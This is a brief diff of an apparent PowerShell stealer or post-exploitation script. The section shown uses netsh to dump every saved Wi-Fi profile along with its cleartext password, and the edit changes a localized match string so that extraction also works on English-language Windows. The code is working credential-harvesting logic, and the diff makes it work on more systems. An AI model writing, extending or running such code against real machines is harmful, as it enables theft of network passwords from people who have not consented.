@@ -50,7 +50,7 @@ if ($gatherWifiProfiles) {
     Write-Output "[ + ] Gathering wifi profiles"
     $WirelessSSIDs = (netsh wlan show profiles | Select-String ': ' ) -replace ".*:\s+"
     $WifiInfo = foreach($SSID in $WirelessSSIDs) {
-        $Password = (netsh wlan show profiles name=$SSID key=clear | Select-String 'Conteúdo da Chave') -replace ".*:\s+" # Todo: Make a language based key content shit, if you are not brazilian womp womp, wont work.
+        $Password = (netsh wlan show profiles name=$SSID key=clear | Select-String 'Key Content') -replace ".*:\s+" # Todo: Make a language based key content shit, if you are not brazilian womp womp, wont work.
         New-Object -TypeName psobject -Property @{"SSID"=$SSID;"Password"=$Password}
     }
     if ([string]::IsNullOrEmpty($WifiInfo)) {     $WifiInfo= "ERROR: No wireless card detected"    }
